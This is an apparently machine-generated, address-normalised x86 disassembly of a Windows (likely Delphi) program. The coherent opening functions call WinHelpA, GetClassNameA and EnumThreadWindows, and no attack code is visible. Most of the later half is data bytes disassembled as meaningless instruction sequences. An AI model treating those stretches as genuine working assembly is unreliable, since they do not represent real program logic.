lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_404190
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_44722c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_44728e
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447295
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_446c64
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_4472a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_447320
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_446c64
mov eax ebx
call sub_4475a8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447327
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_447500
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_447330
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_44741b
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_4475a8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447422
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f44
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_408054
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_447500
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_408054
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_403f74
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_446c64
mov eax [ ebp - 0x14 ]
call sub_4043e0
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_447430
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4087a4
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_44748b
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408780
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_447500
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4043d0
xor eax eax
push ebp
push sub_447576
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_4474e4
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44757d
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407d7c
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_44758c
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_4475a8
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_4474e4
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_447588
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_44758c
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_447604
sub_447604
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_447681
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_447064
call GetTickCount
mov ebx eax
push 0x0
call sub_4062a0
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_446c64
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447688
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_4043e0
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_447690
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403160
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_4034f4
call sub_4057a4
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_4476d8
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_447704
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_447772
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447779
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_40578c
mov eax rw-data
call sub_40578c
mov eax rw-data
call sub_40578c
mov eax rw-data
call sub_403f20
mov eax rw-data
call sub_40578c
mov eax [ rw-data ]
call sub_446d34
sub_44777c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4477ce
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4477d5
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_447690
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_40578c
mov edx eax
mov eax [ rw-data ]
call sub_42ba28
sub_4477d8
fdiv [ edi + 0x44 ]
add [ ecx ] al
or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
sbb [ edi + 0x540b0044 ] ah
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc esp
add [ eax - 0x59 ] ch
inc esp
add ah ch
xor eax [ eax ]
loopne r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ebp * 8 + 0x78 ] si
inc esp
nop
clc
ja r-xdata
inc eax
add [ eax + edi * 2 + 0x44 ] dh
add [ eax ] al
push es
popad
insb
dec esp
je r-xdata
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
cmpsd [ esi ] [ edi ]
inc esp
add [ eax + 0x160044a7 ] cl
push esp
inc edx
popad
jae r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax + ebp * 4 ] al
inc esp
add ah dh
cmpsb [ esi ] [ edi ]
inc esp
add al dh
cmpsb [ esi ] [ edi ]
inc esp
add ah dh
movsd [ edi ] [ esi ]
inc esp
add [ edi - 0x5a47ffbc ] ch
inc esp
add [ edi ] cl
inc esp
add [ eax ] dl
cmpsd [ esi ] [ edi ]
inc esp
add [ eax ] bl
cmpsd [ esi ] [ edi ]
inc esp
add al bl
outsd
insb
jae r-xdata
je r-xdata
inc esp
add [ eax - 0x59 ] ch
inc esp
add ah ch
xor eax [ eax ]
loopne r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr [ eax + 0x44 ]
jae r-xdata
add [ eax + 0x7a ] cl
inc esp
inc esp
jb r-xdata
add [ ebx + 0x447958c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
jb r-xdata
push esp
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
inc esp
or al 0xa7
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
js r-xdata
jb r-xdata
popad
inc esp
add [ eax ] al
dec eax
jpe r-xdata
inc ebx
outsd
outsb
je r-xdata
js r-xdata
inc esp
add [ edi ] cl
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
add [ eax ] dl
cmpsd [ esi ] [ edi ]
inc esp
add [ eax ] bl
cmpsd [ esi ] [ edi ]
inc esp
add [ ebx ] cl
add [ eax + eax ] dh
add [ eax ] al
mov al 0x10
inc eax
add al bl
xor eax [ eax ]
js r-xdata
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
adc [ eax + 0x44 ] bh
add [ ebx ] al
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ eax + edi * 2 ] cl
inc esp
add [ esi ] al
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
inc esp
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ebx * 2 + 0x79 ] si
inc esp
add ah ah
js r-xdata
cmpsd [ esi ] [ edi ]
inc esp
add [ eax + 0x120044a7 ] cl
push esp
inc esp
jb r-xdata
add [ eax - 0x58 ] dl
inc esp
add ah dh
movsd [ edi ] [ esi ]
inc esp
add [ edi - 0x5a47ffbc ] ch
inc esp
add [ eax + ebp * 4 + 0x44 ] bl
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax + ebp * 4 ] al
inc esp
add [ eax ] dl
cmpsd [ esi ] [ edi ]
add [ eax ] al
add [ eax ] al
or al 0x79
inc esp
add al bl
xor eax [ eax ]
js r-xdata
inc esp
add ah ch
xor eax [ eax ]
cmpsd [ esi ] [ edi ]
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x60 ] si
jns r-xdata
add [ ecx + edi * 2 + 0x3c0044 ] al
add [ eax ] al
push 0xd8004478
xor eax [ eax ]
js r-xdata
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + esi * 4 + 0x78 ] si
inc esp
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
inc esp
inc ebx
outsd
outsb
je r-xdata
add [ eax - 0x59 ] ch
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] al
push ss
push esp
inc edx
popad
jae r-xdata
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax - 0xbffbb5b ] dh
cmpsb [ esi ] [ edi ]
inc esp
add al dh
cmpsb [ esi ] [ edi ]
inc esp
add ah dh
movsd [ edi ] [ esi ]
inc esp
add [ eax - 0x5b ] bl
inc esp
add [ eax + 0xc0044a5 ] bh
cmpsd [ esi ] [ edi ]
outsd
insd
inc esp
add [ edx + ebp * 4 + 0x44 ] bh
add al dh
cmpsb [ esi ] [ edi ]
inc esp
add ah dh
movsd [ edi ] [ esi ]
inc esp
add [ ecx + ebp * 4 ] dh
inc esp
add [ eax + 0xc0044a5 ] bh
inc ebx
outsd
outsb
je r-xdata
cmpsd [ esi ] [ edi ]
inc esp
add [ eax + ebp * 4 + 0x44 ] bh
add al bl
cmpsd [ esi ] [ edi ]
inc esp
add [ eax + 0x140044a7 ] cl
push esp
inc esp
jb r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x58 ] si
jpe r-xdata
inc esp
add [ eax + ebp * 4 + 0x44 ] bh
add al bl
outsd
insb
jae r-xdata
loopne r-xdata
inc esp
jb r-xdata
inc esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx * 4 + 0x7b ] si
inc esp
add [ edi ] al
cmpsd [ esi ] [ edi ]
inc esp
add [ eax ] dl
cmpsd [ esi ] [ edi ]
inc esp
add [ eax ] bl
cmpsd [ esi ] [ edi ]
inc esp
add [ eax - 0x5fffbb57 ] dl
test al 0x44
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
cmp [ ebx + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 + 0x44 ] dh
add [ eax ] dh
add [ eax ] al
or al 0x79
inc esp
add al bl
xor eax [ eax ]
js r-xdata
add [ eax - 0x58 ] dl
inc esp
add ah dh
movsd [ edi ] [ esi ]
inc esp
add [ edi - 0x5a47ffbc ] ch
inc esp
add [ eax + ebp * 4 + 0x44 ] bl
add [ eax + 0x4004031 ] al
test al 0x44
add [ eax ] bh
test al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
jpe r-xdata
add [ ebp + 0x7a1c0040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
test al 0x44
add al ah
xor eax [ eax ]
sub [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax + 0x4004031 ] al
test al 0x44
inc ebx
outsd
outsb
je r-xdata
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + edi + 0x7b ] si
inc esp
add [ ecx + edi * 2 + 0x44 ] bl
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc esp
add [ eax - 0x13ffbb56 ] dl
xor eax [ eax ]
loopne r-xdata
add [ eax ] bl
cmpsd [ esi ] [ edi ]
inc esp
outsd
insb
jae r-xdata
inc esp
add [ eax - 0x59 ] ch
inc esp
add ah ch
xor eax [ eax ]
loopne r-xdata
add [ eax ] dl
add [ eax ] al
add [ eax ] al
sar [ ecx + 0x44 ] 0x1
add al bl
xor eax [ eax ]
js r-xdata
add al bl
test eax 0xaa540044
inc esp
add [ eax - 0x56 ] ch
inc esp
add [ eax + 0x110044aa ] cl
push esp
inc esp
jb r-xdata
test eax 0xa8a00044
inc esp
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
add al 0xa9
inc esp
add [ eax + ebp * 4 ] al
inc esp
add [ edx + ebp * 4 + 0x44 ] bh
add al dh
cmpsb [ esi ] [ edi ]
inc esp
add ah dh
movsd [ edi ] [ esi ]
inc esp
add [ ecx + ebp * 4 ] dh
inc esp
add [ eax + 0xc0044a5 ] bh
cmpsd [ esi ] [ edi ]
inc esp
inc ecx
add [ edx + ecx * 4 + 0x4b680041 ] al
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
cwde
jl r-xdata
add [ ebx + 0x447bfcc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
jl r-xdata
add al bl
test eax 0xaa540044
inc esp
add [ eax - 0x56 ] ch
inc esp
add [ eax + 0xf0044aa ] cl
push esp
inc esp
jb r-xdata
test eax 0xa8a00044
inc esp
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
add al 0xa9
inc esp
add [ eax + ebp * 4 ] al
test al 0x44
inc esp
add [ eax + ebp * 4 + 0x33ec0044 ] bl
inc eax
add al ah
xor eax [ eax ]
sub [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
xor eax [ eax ]
sub [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax - 0x2fffbdf1 ] dh
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add [ eax - 0x44 ] ah
inc esp
add [ eax - 0x75 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
jl r-xdata
add [ eax ] dl
cmpsd [ esi ] [ edi ]
inc esp
add [ eax ] dh
add [ eax ] al
in al dx
jpe r-xdata
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x447dcc90
add [ ebx ] al
or al 0x54
add al ch
xor eax [ eax ]
in al dx
jae r-xdata
inc edx
add [ ebx + ecx * 2 + 0x42 ] dl
add [ esp + edi * 4 + 0x540e0044 ] cl
inc ebx
add [ eax + 0x4b ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6400447c ] dh
add [ eax ] al
add [ eax - 0x5fffbb57 ] dl
test al 0x44
add al bl
xor eax [ eax ]
js r-xdata
add [ eax + 0x600447e ] dl
outsd
insd
popad
je r-xdata
inc esp
inc edx
jne r-xdata
inc ebp
add [ eax - 0x40 ] dl
inc esp
add ah bl
cwde
inc ebp
add al dh
cwde
inc ebp
add al cl
rol [ eax + eax - 0x7c ] 0xc0
inc esp
add [ ecx + ebx * 4 ] ch
inc ebp
add [ eax - 0x67 ] al
inc ebp
add [ eax + eax * 8 - 0x6697ffbc ] bh
inc ebp
add [ eax ] bl
rol [ eax + eax + 0x70 ] 0x99
inc ebp
add [ eax ] bh
rol [ eax + eax + 0x78 ] 0x99
inc ebp
add [ edx + eax * 8 + 0x44 ] cl
add [ edx + eax * 8 ] ch
inc esp
add [ edx + eax * 8 + 0x44 ] ch
add [ eax - 0x3f ] bl
inc esp
add [ ecx + ebx * 4 - 0x666fffbb ] cl
inc ebp
add [ ecx + eax * 8 + 0x44 ] bh
add ah ch
mov esi 0x54120044
inc ebx
outsd
outsb
je r-xdata
cwde
mov esi 0xfe40044
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
add [ eax ] dl
and eax 0x33d80042
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec44bcb8
xor eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les edi [ esp + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x7c
inc esp
les edi [ esp + eax * 2 ]
pop es
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
popad
inc ecx
add [ eax - 0x75 ] dh
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
pushad
mov esp 0x8b680044
push edx
imul esp [ edi + 0x68 ] 0x6b610874
outsd
insb
jae r-xdata
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
inc edx
add al dh
rol [ eax + eax + 0x18 ] 0x10
inc edx
add [ ecx + eax * 8 + 0xf680044 ] bl
inc edx
add ah bh
cmovb eax [ eax ]
push eax
adc [ edx ] al
fdivr [ edi - 0x674bffbc ]
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
inc eax
add al ch
xor eax [ eax ]
outsd
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esi + edi * 2 + 0x44 ] al
add [ ebx ] cl
jae r-xdata
enter 0x447e 0x0
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al cl
jge r-xdata
mov al 0xf
inc edx
add al dl
jae r-xdata
lea eax [ eax ]
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
pop eax
mov al [ ecx ]
call 0x7044c48e
mov eax [ ecx ]
test [ edx - 0x4143ffbf ] cl
in al dx
xor eax [ eax ]
loopne r-xdata
outsd
insb
jae r-xdata
jle r-xdata
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
ror [ eax + 0x7e ] 0x44
outsb
add [ fs : eax ] eax
add [ eax ] al
push es
jne r-xdata
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
jl r-xdata
jl r-xdata
popad
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
dec ebp
clc
jg r-xdata
popad
inc eax
add [ eax + 0x74614454 ] al
add esp edi
jle r-xdata
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
add [ esi ] al
add [ ecx ] ecx
push esp
push esp
popad
bound ecx [ edi + 0x72 ]
jb r-xdata
inc ebp
outsb
je r-xdata
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
lea eax [ eax ]
xchg esp eax
jle r-xdata
insb
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
outsd
outsb
je r-xdata
add [ eax + eax ] ah
xor eax [ eax ]
loopne r-xdata
add ah ah
xor eax [ eax ]
call 0xffffffffec44bd58
add [ ebp + 0x42 ] bh
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
imul esp [ edi + 0x68 ] 0x447f6074
js r-xdata
imul esp [ gs : edi + 0x68 ] 0x447f6074
add [ eax + eax ] cl
add bh bh
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
jne r-xdata
add [ eax + eax ] dl
add bh bh
xor [ esi + 0x10044 ] bh
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ebp + 0x69 ] cl
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0xb400408d
add [ eax + eax + 0x8 ] 0xb
push esp
dec ebp
outsd
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
xor [ esi + 0x10044 ] bh
inc esp
add [ ebp + edi * 4 + 0x54100044 ] ch
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
mov ebp 0x8b700044
add [ edi + edi * 2 ] eax
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax + 0x6d695454 ] al
add [ gs : eax ] ecx
jg r-xdata
jb r-xdata
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
jbe r-xdata
outsd
insb
jae r-xdata
inc edx
add ah bl
mov edi 0x98b40044
outsd
insb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
pushad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x447f6074
jb r-xdata
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
add [ eax + 0x7f ] dl
inc esp
add [ esi ] al
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
jae r-xdata
inc esp
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
add [ gs : eax ] eax
add [ eax ] al
jle r-xdata
add [ ebp + 0x7d380040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edi * 2 + 0x1c0044 ] dh
add [ eax ] al
int3
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x44812cc0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
lea eax [ eax ]
mov ah 0x80
inc esp
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
add [ eax ] al
add al [ eax ]
add [ eax ] dl
add [ eax ] al
push [ eax ]
mov esi 0x10044
jg r-xdata
imul ebp [ esi + 0x74 ] 0x447fcc73
add [ esi + ebx * 2 + 0x41 ] bh
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
xor [ esi + 0x10044 ] bh
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
or [ ebp + 0x61 ] cl
inc ebx
outsd
outsb
jae r-xdata
inc ecx
add [ edx + ecx * 4 - 0x4143ffbf ] al
add [ eax - 0x75 ] dh
imul ebp [ esi + 0x74 ] 0x657a6953
add eax 0x0
inc esp
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
add [ ebx ] al
add [ eax ] al
add [ edi + edi * 2 ] al
inc esp
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
